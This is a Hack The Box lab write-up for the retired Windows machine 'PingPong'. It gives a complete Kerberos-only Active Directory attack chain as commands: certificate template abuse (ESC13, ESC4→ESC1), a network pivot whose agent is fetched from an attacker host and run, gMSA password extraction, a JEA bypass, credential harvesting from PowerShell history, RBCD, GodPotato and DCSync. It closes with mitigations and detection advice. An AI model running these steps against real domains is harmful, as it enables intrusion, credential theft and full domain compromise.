---
machine: PingPong
os: Windows
difficulty: Insane
platform: Hack The Box
achievement: https://labs.hackthebox.com/achievement/machine/4187928/891
category: Machines
state: Retired
tags: [windows, active-directory, kerberos, esc13, gmsa, jea, rbcd, adcs]
---

# PingPong — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> **Difficulty:** Insane.
> No real flags or credentials: every value appears as `<...>`.

## TL;DR

Two Active Directory forests, `PING.HTB` and `PONG.HTB`, joined by a trust with **NTLM disabled**, so the whole chain is pure Kerberos (TGT in a `.ccache`, `-k -no-pass`, AES256 keys). Six phases: **(1)** ESC13 on the `TemporaryWinRM` template gives an ordinary user a certificate, and PKINIT turns it into a TGT; **(2)** a Ligolo-ng pivot opens the internal `192.168.2.0/24` network; **(3)** a `GenericAll` on the gMSA manager group, plus a `groupType` conversion and a SID-based add, allows reading `msDS-ManagedPassword`; **(4)** the service account's JEA endpoint is bypassed with pypsrp and an `& { }` wrapper, and its PowerShell history hands over human credentials; **(5)** RBCD + S4U2Proxy against MSSQL, `xp_cmdshell`, GodPotato and DCSync yield an AES256 key for a user privileged in the other forest; **(6)** back in PING, ESC4 turns a template into ESC1 and an `Administrator` certificate finishes the box.

## Recon

```bash
nmap -Pn -sS -sV -p- --min-rate 3000 <IP_DC1> -oA nmap_dc1
host dc1.ping.htb; host dc2.pong.htb
```

| Port | Service |
|---|---|
| 88/tcp | Kerberos |
| 389, 636/tcp | LDAP / LDAPS |
| 445/tcp | SMB |
| 1433/tcp | MSSQL |
| 5985/tcp | WinRM |
| 9389/tcp | AD Web Services |

- `dc1.ping.htb` resolves to the target IP; `dc2.pong.htb` resolves to an **internal** address (`192.168.2.x`) that is not routable from the VPN, so a pivot is required.
- NTLM is off in both domains, so `netexec winrm` and anything that negotiates NTLM fails immediately.

## The clock, before anything else

More than five minutes of skew and Kerberos returns `KRB_AP_ERR_SKEW`, making the rest of the chain look broken. Here the skew was **+8 h** and the culprit was not `systemd-timesyncd` (inactive) but **VirtualBox Guest Additions** (`vboxservice`), re-syncing with the host every few seconds.

```bash
sudo systemctl stop vboxservice
sudo systemctl mask vboxservice          # stop alone is not enough: it comes back
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u dc1.ping.htb
date -u                                  # must match the DC
```

## Phase 1 — ESC13 on `TemporaryWinRM`

The `TemporaryWinRM` template is tied to an **authorisation group**: members receive a certificate that works for WinRM. An ordinary domain user is in it, so the certificate is issued without touching any ACL.

```bash
export KRB5_CONFIG=$PWD/krb5.conf

# 1) TGT with a password (NTLM off → Kerberos)
impacket-getTGT 'ping.htb/<user>:<password>' -dc-ip <IP_DC1>

# 2) Certificate from the ESC13 template
certipy-ad req -k -no-pass -target dc1.ping.htb -target-ip <IP_DC1> \
  -dc-ip <IP_DC1> -dc-host dc1.ping.htb \
  -ca ping-DC1-CA -template TemporaryWinRM -out <user>.pfx

# 3) PKINIT: certificate → TGT
certipy-ad auth -pfx <user>.pfx -username <user> -domain ping.htb -dc-ip <IP_DC1>
```

- `-target`/`-dc-host` keep the canonical name (SPN, SAN) while `-target-ip`/`-dc-ip` pin the real route: mandatory when AD DNS hands back internal addresses.
- `certipy auth` writes the TGT to a `.ccache`, which `evil-winrm`, `bloodyAD` and `ldeep` then consume.

```bash
export KRB5CCNAME=$PWD/<user>.ccache
printf 'whoami\nhostname\nexit\n' | evil-winrm -i dc1.ping.htb -r PING.HTB -K $KRB5CCNAME -n
```

`-r` is needed for evil-winrm to build a coherent `krb5.conf`. **Note:** the tool prefers `KRB5CCNAME` over `-K`, so export the right ccache before every connection.

## Phase 2 — Pivot into `PONG.HTB`

Ligolo-ng creates a real TUN interface on the attacker box: `nmap`, LDAP and MSSQL talk to `192.168.2.2` as if it were local, with no per-service port forward.

```bash
# Proxy with a TUN interface (answer 'n' to the WebUI prompt)
tmux new-session -d -s ligolo \
  "ip tuntap add mode user name ligolo; ip link set ligolo up; \
   ./proxy -self -interface ligolo"
tmux send-keys -t ligolo "n" Enter

# HTTP server to deliver the agent: evil-winrm's upload
# corrupted 7 MB binaries in this version
python3 -m http.server 8000
```

```powershell
# On DC1, over WinRM
curl.exe -o C:\ProgramData\agent.exe http://<LHOST>:8000/agent.exe
C:\ProgramData\agent.exe -connect <LHOST>:11601 -skipverify
```

```
session
add route 192.168.2.0/24
start
```

Small binaries (a ~57 KB GodPotato, for instance) can go through evil-winrm's `upload`; the large one cannot.

## Phase 3 — gMSA: from an ACL to an AES256 key

A PING user holds `GenericAll` on `CN=gMSA Managers`, the group controlling the `Pong_gMSA$` service account. Two classic brakes:

1. The group is **Global**, and a Global group cannot hold members from another domain.
2. Even after the membership is added, the existing TGT carries the **stale PAC**, without the new group.

```bash
export KRB5CCNAME=$PWD/<user>.ccache
./kvno ldap/dc2.pong.htb            # cross-realm referral

B=bloodyAD
DN='CN=gMSA Managers,CN=Users,DC=pong,DC=htb'
SID='<foreign_user_SID>'

$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   add genericAll "$DN" "$SID"

# Global (-2147483646) → Universal (-2147483640) → Domain Local (-2147483644)
$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   set object "$DN" groupType -v -2147483640
$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   set object "$DN" groupType -v -2147483644

$B --host dc2.pong.htb --dc-ip 192.168.2.2 -d pong.htb -u <user> -k \
   add groupMember "$DN" "$SID"
```

- The conversion **must go through Universal**: AD does not allow Global→Domain Local directly without losing members.
- The add is done **by SID**: the foreign principal already exists in the target domain's `ForeignSecurityPrincipals`, and resolving it by DN fails.
- `impacket-getST` returns `KDC_ERR_WRONG_REALM` on cross-realm operations; MIT Kerberos' `kvno` follows the referral. It precedes every LDAP operation against DC2.

```bash
# Refresh the TGT so the PAC includes the membership
certipy-ad auth -pfx <user>.pfx -username <user> -domain ping.htb -dc-ip <IP_DC1>
./kvno ldap/dc2.pong.htb
ldeep ldap -u <user> -d ping.htb -k -s ldap://dc2.pong.htb gmsa
```

`ldeep ... gmsa` extracts `msDS-ManagedPassword`; `bloodyAD get gmsa` does not return the password. The output is `Pong_gMSA$`'s AES256 key.

## Phase 4 — Restrictive JEA and credentials in the history

The service account only has a **JEA** endpoint called `restricted` on DC1. `evil-winrm` cannot select a `ConfigurationName`, so **pypsrp** is used:

```python
wsman = WSMan("dc1.ping.htb", port=5985, ssl=False, path="wsman",
              auth="kerberos", encryption="auto", no_proxy=True,
              negotiate_service="HTTP")

with RunspacePool(wsman, configuration_name="restricted") as pool:
    ps = PowerShell(pool)
    ps.add_script("& { " + command + " }")   # wrapper the JEA parser accepts
    for out in ps.invoke():
        print(out)
```

The `& { ... }` wrapper (call operator) makes the endpoint's *language mode* evaluate the block as a command; it is the classic way around JEA restrictions without leaving the endpoint.

The goldmine is the service account's PSReadLine history, where credentials used with `ConvertTo-SecureString` were left behind:

```powershell
cmd /c findstr /i /n "SecureString ConvertTo-SecureString" ^
  "C:\Users\<gMSA>$\\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Filtering **on the target** matters: a full dump gets truncated in the pipeline and the useful lines are lost at the end.

## Phase 5 — RBCD, MSSQL, GodPotato and DCSync (DC2)

With a human account in PONG:

```bash
impacket-getTGT 'pong.htb/<user2>:<password2>' -dc-ip 192.168.2.2
export KRB5CCNAME=$PWD/<user2>.ccache

# RBCD: svc_sql accepts that the gMSA impersonates anyone
bloodyAD -d pong.htb --host dc2.pong.htb --dc-ip 192.168.2.2 \
  -u <user2> -k add rbcd svc_sql '<gMSA>$'

# S4U2Proxy: impersonation ticket for the MSSQL SPN
export KRB5CCNAME=$PWD/'<gMSA>$.ccache'
impacket-getST -k -no-pass -spn 'mssqlsvc/dc2.pong.htb' \
  -impersonate '<victim_user>' -dc-ip 192.168.2.2 'pong.htb/<gMSA>$'
```

The MSSQL service runs with **SeImpersonatePrivilege**, so `xp_cmdshell` plus a *potato* yields SYSTEM:

```sql
EXEC xp_cmdshell 'C:\ProgramData\gp.exe -cmd "net localgroup administrators pong\<user2> /add"';
```

- **GodPotato** works where JuicyPotato no longer does (COM/DCOM mitigated in SQL Server 2022); PrintSpoofer is more restrictive and RottenPotato is obsolete.
- With local admin on DC2, a targeted DCSync of a user privileged in the other forest:

```bash
impacket-secretsdump -k -no-pass 'pong.htb/<user2>@dc2.pong.htb' \
  -dc-ip 192.168.2.2 -target-ip 192.168.2.2 -just-dc-user <target_user>
```

`-just-dc-user` avoids dumping the whole `ntds.dit` and returns the AES256 keys, which is what you need with NTLM off.

## Phase 6 — Back to PING: ESC4 → ESC1 → Administrator

```bash
impacket-getTGT -aesKey <target_user_aes256> 'pong.htb/<target_user>' -dc-ip 192.168.2.2
export KRB5CCNAME=$PWD/<target_user>.ccache
./kvno ldap/dc1.ping.htb            # referral back to PING

T='CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb'

# ESC4: allow a supplied subject and give template control to Authenticated Users
bloodyAD -d ping.htb --host dc1.ping.htb --dc-ip <IP_DC1> -u <target_user> -k \
  set object "$T" msPKI-Certificate-Name-Flag -v 1        # SUPPLY_SUBJECT
bloodyAD -d ping.htb --host dc1.ping.htb --dc-ip <IP_DC1> -u <target_user> -k \
  add genericAll "$T" 'S-1-5-11'
```

With `SUPPLY_SUBJECT` and write access, the template is **ESC1**: anyone can request a certificate with any UPN and SID.

```bash
certipy-ad req -k -no-pass -target dc1.ping.htb -target-ip <IP_DC1> \
  -dc-ip <IP_DC1> -dc-host dc1.ping.htb \
  -ca ping-DC1-CA -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' -sid '<Administrator_SID>' -out administrator.pfx

certipy-ad auth -pfx administrator.pfx -username Administrator \
  -domain ping.htb -dc-ip <IP_DC1>

export KRB5CCNAME=$PWD/administrator.ccache
printf 'whoami\ntype C:\\Users\\Administrator\\Desktop\\root.txt\nexit\n' | \
  evil-winrm -i dc1.ping.htb -r PING.HTB -K $KRB5CCNAME -n
```

`-sid` makes the certificate's PAC carry Administrator's SID, not just the UPN.

## Evidence (redacted)

```text
DC2: C:\Users\<user>\Desktop\user.txt          -> <flag>
DC1: C:\Users\Administrator\Desktop\root.txt   -> <flag>
```

- A certificate issued from `TemporaryWinRM` and a PKINIT TGT.
- `ldeep` printing the gMSA key.
- PSReadLine history with the human account's credentials.
- An impersonation ticket for `mssqlsvc/dc2.pong.htb`.
- A certificate for `Administrator@ping.htb` and `whoami` = `ping\administrator`.

## Time-wasting errors

| Symptom | Cause | Fix |
|---|---|---|
| `KRB_AP_ERR_SKEW` | +8 h skew from `vboxservice` | `stop` + `mask`, then `ntpdate` against DC1 |
| `KDC_ERR_WRONG_REALM` | impacket does not follow cross-realm referrals | `kvno ldap/dcN.domain` before each operation |
| `SEC_E_LOGON_DENIED` on LDAP | missing service ticket, or the PAC lacks the new group | `kvno` and refresh the TGT via PKINIT |
| Shell as the previous user | `evil-winrm` prefers `KRB5CCNAME` over `-K` | export the right ccache before launching it |
| `apt` locked by another process | an `apt upgrade` in flight | `apt-get download` + `dpkg-deb -x` for the needed binary |
| Corrupted pivot agent | evil-winrm's `upload` with large binaries | serve it over HTTP and fetch it with `curl.exe` |
| Credentials lost in the history | truncated pipeline output | filter with `findstr` on the DC itself |

## Lessons

- **No clock, no Kerberos**, and the culprit may not be the obvious time service: check who rewrites the clock.
- **NTLM off changes the tooling**: everything goes through `ccache`, `-k -no-pass` and AES keys; NTLM-negotiating tools are useless.
- **A certificate is a credential**: ESC13 needs no ACL edit, only membership of the template's authorisation group.
- **Cross-realm is `kvno`**, not impacket, and the PAC expires: request a new TGT after every group change.
- **`groupType` matters**: a perfect ACL on a Global group with no valid members is worthless.
- **JEA is not a cage**: the endpoint restricts cmdlets, not reading profile files or running external commands.
- **PowerShell history is a credential store** in plain text.
- **RBCD + S4U2Proxy** turns control of an account into a service ticket for any user; with `SeImpersonate` on the service, SYSTEM is next.
- **ESC4→ESC1** is the shortest route once a template is writable: `msPKI-Certificate-Name-Flag = 1` and a broad ACE are enough.

## Mitigations and detection

- **AD CS templates**: review authorisation groups (ESC13), who can write to templates (ESC4), and any template with `SUPPLY_SUBJECT` plus broad enrolment rights (ESC1). Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` and audit template attribute changes.
- **gMSA**: restrict who is a manager (`msDS-GroupMSAMembership`), review `GenericAll`/`WriteMembers` on manager groups, and alert on `groupType` conversions.
- **JEA**: keep credentials out of histories, clear `ConsoleHost_history.txt`, restrict which external commands are visible, and never reuse a service account for human work.
- **RBCD**: monitor writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` and audit which accounts can write it.
- **MSSQL**: drop `SeImpersonatePrivilege` from the service account when not strictly required, restrict `xp_cmdshell`, and use managed service accounts without local privileges.
- **Kerberos**: NTLM disabled **together with** the rest of the hardening (LDAP signing, channel binding, RC4 gone) and monitored time sync.
- **Detection**: events 5136 (directory attribute changes), anomalous 4768/4769 across realms, 4886/4887 certificate enrolments, and `certipy`/`Rubeus` execution on endpoints.

## References

- <https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview>
- <https://learn.microsoft.com/powershell/scripting/security/remoting/jea/overview>
- <https://learn.microsoft.com/defender-for-identity/security-assessment-edit-rbcd>
- <https://posts.specterops.io/certified-pre-owned-d95910965cd2>
- <https://www.rfc-editor.org/rfc/rfc4120>
